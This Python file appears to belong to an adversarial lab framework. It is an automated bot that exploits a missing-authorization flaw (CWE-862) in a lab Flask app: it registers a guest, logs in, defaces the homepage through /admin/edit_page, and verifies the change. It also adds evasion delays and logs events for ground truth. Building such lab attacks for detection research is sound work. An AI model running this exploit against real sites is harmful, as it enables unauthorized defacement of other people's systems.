"""Objective bot: CWE-862 Missing Authorization -> homepage defacement.

Real kill chain against the lab Flask target (docker/target/webapp/app.py):
  recon        -> GET / (discover register/login/edit_page surface)
  exploit      -> POST /register (guest role) -> POST /login ->
                   POST /admin/edit_page (endpoint checks "logged in", not
                   "role == admin")
  post_exploit -> GET / and independently verify the defacement marker is
                   now live on the real homepage (not just trusting the
                   POST's 200 status)

CLASS_ID/MITRE_TACTIC feed `configs/lab_objectives.yaml` and the live
orchestrator's ground-truth event log.
"""

from __future__ import annotations

import time
import uuid

import requests

from src.adversarial.bots.lab_objective_base import (
    STAGE_EXPLOIT,
    STAGE_POST_EXPLOIT,
    STAGE_RECON,
    EventLogger,
    ObjectiveEvent,
    evasion_think_time,
    run_via_default_shim,
)
from src.adversarial.lab_clock import LabClock

CLASS_ID = "T1491_web_defacement"
MITRE_TACTIC = "Impact"


def run_objective(
    target_ip: str,
    evasion: str,
    clock: LabClock,
    event_log: EventLogger,
    round_id: str = "",
    base_url: str | None = None,
) -> dict:
    base = base_url or f"http://{target_ip}"
    session = requests.Session()
    marker = f"LAB-DEFACED-{uuid.uuid4().hex[:8]}"
    result: dict = {"class_id": CLASS_ID, "success": False, "marker": marker}

    def log(stage: str, success: bool, evidence: str = "") -> None:
        event_log.log(ObjectiveEvent(CLASS_ID, stage, success, time.time(), evidence, round_id))

    # --- recon: discover the auth/edit surface -------------------------
    try:
        r = session.get(f"{base}/", timeout=5)
        recon_ok = r.status_code == 200 and "register" in r.text
    except requests.RequestException as exc:
        log(STAGE_RECON, False, str(exc))
        return result
    log(STAGE_RECON, recon_ok, f"status={r.status_code}")
    evasion_think_time(evasion, clock)

    # --- exploit: register as a guest, login, hit the unchecked-role
    #     endpoint -----------------------------------------------------
    username = f"guest_{uuid.uuid4().hex[:8]}"
    password = "hunter2-lab"
    try:
        session.post(f"{base}/register", data={"username": username, "password": password}, timeout=5)
        evasion_think_time(evasion, clock)
        session.post(f"{base}/login", data={"username": username, "password": password}, timeout=5)
        evasion_think_time(evasion, clock)
        r = session.post(
            f"{base}/admin/edit_page",
            data={"content": f"<h1>{marker}</h1>"},
            timeout=5,
        )
        exploit_ok = r.status_code in (200, 302)
    except requests.RequestException as exc:
        log(STAGE_EXPLOIT, False, str(exc))
        return result
    log(STAGE_EXPLOIT, exploit_ok, f"status={r.status_code} user={username}")

    # --- post-exploit: independently re-read the live homepage ---------
    evasion_think_time(evasion, clock)
    try:
        r = session.get(f"{base}/", timeout=5)
        success = marker in r.text
    except requests.RequestException as exc:
        log(STAGE_POST_EXPLOIT, False, str(exc))
        return result
    log(STAGE_POST_EXPLOIT, success, f"marker_found={success}")
    result["success"] = success
    return result


def run(target_ip: str, evasion: str) -> int:
    """Legacy `RunFn -> int` shim for ad-hoc CLI use via attack_script.py."""
    return run_via_default_shim(run_objective, target_ip, evasion)
